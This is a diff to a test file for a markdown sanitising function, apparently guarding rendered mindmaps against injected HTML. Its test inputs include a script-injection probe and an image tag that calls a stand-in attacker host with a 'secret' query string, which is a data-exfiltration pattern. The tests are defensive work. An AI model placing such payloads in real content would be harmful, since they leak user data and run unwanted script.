@@ -207,20 +207,13 @@ describe("markdownLinksToPlainText", () => {
 });
 
 describe("stripMarkdownLinks hardening", () => {
-    it("strips raw html tags so rendered mindmaps cannot load images or links", () => {
-        const input = '# Ideen\n- <img src="https://evil.example.com/pixel?d=secret">\n- <a href="https://evil.example.com">Link</a>';
-        const result = stripMarkdownLinks(input);
-        expect(result).not.toContain("<img");
-        expect(result).not.toContain("<a ");
-        expect(result).not.toContain("pixel?d=secret");
-        expect(result).toContain("Link");
-    });
-
-    it("escapes element-like fragments that survive the transform", () => {
-        const result = stripMarkdownLinks("<script>alert(1)</script>\n- <script src=x\n- a < b");
+    it("escapes raw html and element-like fragments that survive the transform", () => {
+        const result = stripMarkdownLinks(
+            '<script>alert(1)</script>\n- <img src="https://evil.example.com/pixel?d=secret">\n- <a href="https://evil.example.com">Link</a>'
+        );
         expect(result).not.toContain("<script");
         expect(result).toContain("alert(1)");
-        expect(result).toContain("a &lt; b");
+        expect(result).toContain("Link");
     });
 
     it("neutralizes images with multiline destinations", () => {
